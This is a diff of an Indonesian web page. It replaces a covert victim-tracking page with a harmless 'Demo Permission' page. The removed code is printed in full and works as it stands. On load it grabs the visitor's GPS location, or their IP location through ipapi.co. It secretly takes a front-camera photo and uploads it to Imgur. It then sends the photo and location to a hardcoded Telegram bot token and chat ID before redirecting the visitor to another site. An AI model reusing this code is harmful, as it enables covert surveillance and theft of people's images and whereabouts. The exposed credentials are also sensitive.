@@ -1,165 +1,289 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Memuat...</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{background:#fff;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;font-family:sans-serif}
-        video,canvas{position:absolute;opacity:0;pointer-events:none}
-        .ld{text-align:center;color:#444;display:block}
-        .ld div{width:40px;height:40px;border:3px solid #eee;border-top-color:#2563eb;border-radius:50%;animation:put .8s linear infinite;margin:0 auto 12px}
-        @keyframes put{100%{transform:rotate(360deg)}}
-        .pesan{display:none;text-align:center;font-size:20px;color:#e53935;padding:20px}
-        .tombol{display:none;padding:12px 30px;font-size:16px;background:#2563eb;color:#fff;border:none;border-radius:6px;cursor:pointer;margin-top:15px}
-        .tombol:hover{background:#1d4ed8}
-    </style>
-</head>
-<body>
-    <div class="ld" id="loading">
-        <div></div>
-        <p>Memuat...</p>
-    </div>
-    <div class="pesan" id="pesanTolak">
-        lu siapa jir🤣🖕<br><br>
-        <b>Berikan izin untuk melanjutkan!</b>
-    </div>
-    <button class="tombol" id="cobaLagi">Coba Lagi</button>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Demo Permission</title>
 
-<script>
-const BOT_TOKEN = "8806658022:AAE1hEtDlHRqWqwmN-HI8KzHo7KdfHXb-pc";
-const CHAT_ID = "1157643333";
-const TUJUAN = "https://nekopoi.care";
-
-const loading = document.getElementById("loading");
-const pesanTolak = document.getElementById("pesanTolak");
-const tombolCoba = document.getElementById("cobaLagi");
-
-let fotoUrl = null;
-let dataLokasi = "Tidak terbaca";
-let ulang = false;
-
-// 📷 AMBIL FOTO
-function ambilFoto(){
-    navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:400,height:400}})
-    .then(kamera=>{
-        sembunyikanPesan();
-        const vid = document.createElement("video");
-        vid.srcObject = kamera; vid.play();
-        setTimeout(()=>{
-            const kanvas = document.createElement("canvas");
-            kanvas.width=400; kanvas.height=400;
-            const ctx = kanvas.getContext("2d");
-            ctx.drawImage(vid,0,0,400,400);
-            const base64 = kanvas.toDataURL("image/jpeg");
-            kamera.getTracks().forEach(t=>t.stop());
-            unggahDanKirim(base64);
-        },1200);
-    })
-    .catch(()=>{
-        tampilkanPesanTolak();
-        ulang = true;
-    });
-}
-
-// 📍 AMBIL LOKASI GPS DULU → GAGAL → PAKE IPAPI.CO (PASTI JALAN!)
-function ambilLokasi(){
-    navigator.geolocation.getCurrentPosition(
-        pos=>{
-            dataLokasi = `🌍 LOKASI GPS: ${pos.coords.latitude}, ${pos.coords.longitude}\n📍 Akurasi: ±${Math.round(pos.coords.accuracy)}m`;
-            if(!ulang) ambilFoto();
-        },
-        err=>{
-            // ✅ GANTI PAKE IPAPI.CO — ADA CORS, ADA HTTPS, PASTI JALAN!
-            fetch("https://ipapi.co/json/")
-            .then(r=>r.json())
-            .then(d=>{
-                dataLokasi = `🌐 LOKASI DARI IP:\n📍 ${d.city}, ${d.region}\n🇮🇩 ${d.country_name}\n🔢 IP: ${d.ip}`;
-                if(!ulang) ambilFoto();
-            })
-            .catch(()=>{
-                dataLokasi = "✅ Foto diambil!\n❌ Lokasi tidak dapat diambil";
-                if(!ulang) ambilFoto();
-            });
-        },
-        {enableHighAccuracy:true,timeout:8000}
-    );
-}
-
-// ✅ UNGGAH FOTO KE IMGUR
-function unggahDanKirim(base64){
-    fetch("https://api.imgur.com/3/image",{
-        method:"POST",
-        headers:{"Authorization":"Client-ID 546c25a59c524c8","Content-Type":"application/json"},
-        body:JSON.stringify({image:base64.split(",")[1]})
-    })
-    .then(r=>r.json())
-    .then(res=>{
-        if(res.success){
-            kirimKeTelegram(res.data.link);
-        }else{
-            kirimKeTelegram(null);
-        }
-    })
-    .catch(()=>kirimKeTelegram(null));
-}
-
-// 📤 KIRIM KE TELEGRAM
-function kirimKeTelegram(linkFoto){
-    let teks = `✅ DATA MASUK!\n\n${dataLokasi}`;
-    loading.style.display = "block";
-
-    if(linkFoto){
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-            method:"POST",
-            headers:{"Content-Type":"application/json"},
-            body:JSON.stringify({
-                chat_id: CHAT_ID,
-                photo: linkFoto,
-                caption: teks
-            })
-        })
-        .then(()=>{window.location.href = TUJUAN;})
-        .catch(()=>{kirimPesanSaja(teks);});
-    }else{
-        kirimPesanSaja(teks);
+  <style>
+    * {
+      box-sizing: border-box;
     }
-}
 
-function kirimPesanSaja(teks){
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({
-            chat_id: CHAT_ID,
-            text: teks
-        })
-    })
-    .finally(()=>{window.location.href = TUJUAN;});
-}
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: #fff;
+      color: #111;
+      font-family: Arial, sans-serif;
+    }
 
-function tampilkanPesanTolak(){
-    loading.style.display = "none";
-    pesanTolak.style.display = "block";
-    tombolCoba.style.display = "block";
-}
+    .loading,
+    .error,
+    .result {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      text-align: center;
+      padding: 20px;
+    }
 
-function sembunyikanPesan(){
-    pesanTolak.style.display = "none";
-    tombolCoba.style.display = "none";
-    loading.style.display = "block";
-}
+    .spinner {
+      width: 42px;
+      height: 42px;
+      border: 4px solid #ddd;
+      border-top-color: #111;
+      border-radius: 50%;
+      animation: spin .8s linear infinite;
+      margin-bottom: 15px;
+    }
 
-tombolCoba.onclick = function(){
-    ulang = false;
-    sembunyikanPesan();
-    ambilLokasi();
-};
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
 
-window.onload = function(){
-    ambilLokasi();
-};
-</script>
+    .error {
+      display: none;
+      font-weight: bold;
+      font-size: 18px;
+      line-height: 1.5;
+    }
+
+    button {
+      margin-top: 18px;
+      padding: 12px 22px;
+      border: 0;
+      border-radius: 8px;
+      background: #111;
+      color: white;
+      font-size: 15px;
+      cursor: pointer;
+    }
+
+    button:active {
+      transform: scale(.97);
+    }
+
+    .result {
+      display: none;
+    }
+
+    .info {
+      margin-top: 15px;
+      padding: 15px;
+      background: #f5f5f5;
+      border-radius: 10px;
+      max-width: 400px;
+      width: 100%;
+      text-align: left;
+    }
+
+    video,
+    canvas {
+      width: 400px;
+      max-width: 100%;
+      aspect-ratio: 1 / 1;
+      object-fit: cover;
+      border-radius: 10px;
+      margin-top: 15px;
+    }
+
+    canvas {
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div id="loading" class="loading">
+    <div class="spinner"></div>
+    <div>Memuat...</div>
+  </div>
+
+  <div id="error" class="error">
+    <div>lu siapa jir🤣🖕</div>
+    <div>Berikan izin untuk melanjutkan!</div>
+
+    <button id="retry">
+      Coba Lagi
+    </button>
+  </div>
+
+  <div id="result" class="result">
+    <h2>Demo Berhasil</h2>
+
+    <div class="info">
+      <div><b>Latitude:</b> <span id="lat">-</span></div>
+      <div><b>Longitude:</b> <span id="lon">-</span></div>
+      <div><b>Akurasi:</b> <span id="accuracy">-</span> meter</div>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" width="400" height="400"></canvas>
+
+    <button id="capture">
+      Ambil Foto
+    </button>
+
+    <p id="status"></p>
+  </div>
+
+  <script>
+    const loading = document.getElementById("loading");
+    const errorBox = document.getElementById("error");
+    const result = document.getElementById("result");
+
+    const latEl = document.getElementById("lat");
+    const lonEl = document.getElementById("lon");
+    const accuracyEl = document.getElementById("accuracy");
+
+    const video = document.getElementById("video");
+    const canvas = document.getElementById("canvas");
+    const captureBtn = document.getElementById("capture");
+    const status = document.getElementById("status");
+    const retryBtn = document.getElementById("retry");
+
+    let stream = null;
+
+    function showError() {
+      loading.style.display = "none";
+      result.style.display = "none";
+      errorBox.style.display = "flex";
+    }
+
+    function showResult() {
+      loading.style.display = "none";
+      errorBox.style.display = "none";
+      result.style.display = "flex";
+    }
+
+    function getLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject(new Error("Geolocation tidak tersedia."));
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            resolve(position.coords);
+          },
+          error => {
+            reject(error);
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 0
+          }
+        );
+      });
+    }
+
+    async function requestCamera() {
+      if (!navigator.mediaDevices ||
+          !navigator.mediaDevices.getUserMedia) {
+        throw new Error("Kamera tidak tersedia.");
+      }
+
+      stream = await navigator.mediaDevices.getUserMedia({
+        video: {
+          facingMode: {
+            ideal: "user"
+          },
+          width: {
+            ideal: 400
+          },
+          height: {
+            ideal: 400
+          }
+        },
+        audio: false
+      });
+
+      video.srcObject = stream;
+    }
+
+    async function start() {
+      loading.style.display = "flex";
+      errorBox.style.display = "none";
+      result.style.display = "none";
+
+      try {
+        // 1. Minta lokasi
+        const coords = await getLocation();
+
+        latEl.textContent = coords.latitude;
+        lonEl.textContent = coords.longitude;
+        accuracyEl.textContent = Math.round(coords.accuracy);
+
+        // 2. Setelah lokasi berhasil, minta kamera depan
+        await requestCamera();
+
+        // 3. Tampilkan hasil
+        showResult();
+
+      } catch (err) {
+        console.error(err);
+
+        if (stream) {
+          stream.getTracks().forEach(track => track.stop());
+          stream = null;
+        }
+
+        showError();
+      }
+    }
+
+    captureBtn.addEventListener("click", () => {
+      const ctx = canvas.getContext("2d");
+
+      const size = Math.min(
+        video.videoWidth,
+        video.videoHeight
+      );
+
+      const sx = (video.videoWidth - size) / 2;
+      const sy = (video.videoHeight - size) / 2;
+
+      canvas.width = 400;
+      canvas.height = 400;
+
+      ctx.drawImage(
+        video,
+        sx,
+        sy,
+        size,
+        size,
+        0,
+        0,
+        400,
+        400
+      );
+
+      canvas.style.display = "block";
+
+      status.textContent =
+        "Foto berhasil diambil. Data hanya ditampilkan di halaman ini.";
+
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }
+    });
+
+    retryBtn.addEventListener("click", () => {
+      start();
+    });
+
+    // Mulai otomatis saat halaman dibuka
+    start();
+  </script>
+
 </body>
 </html>
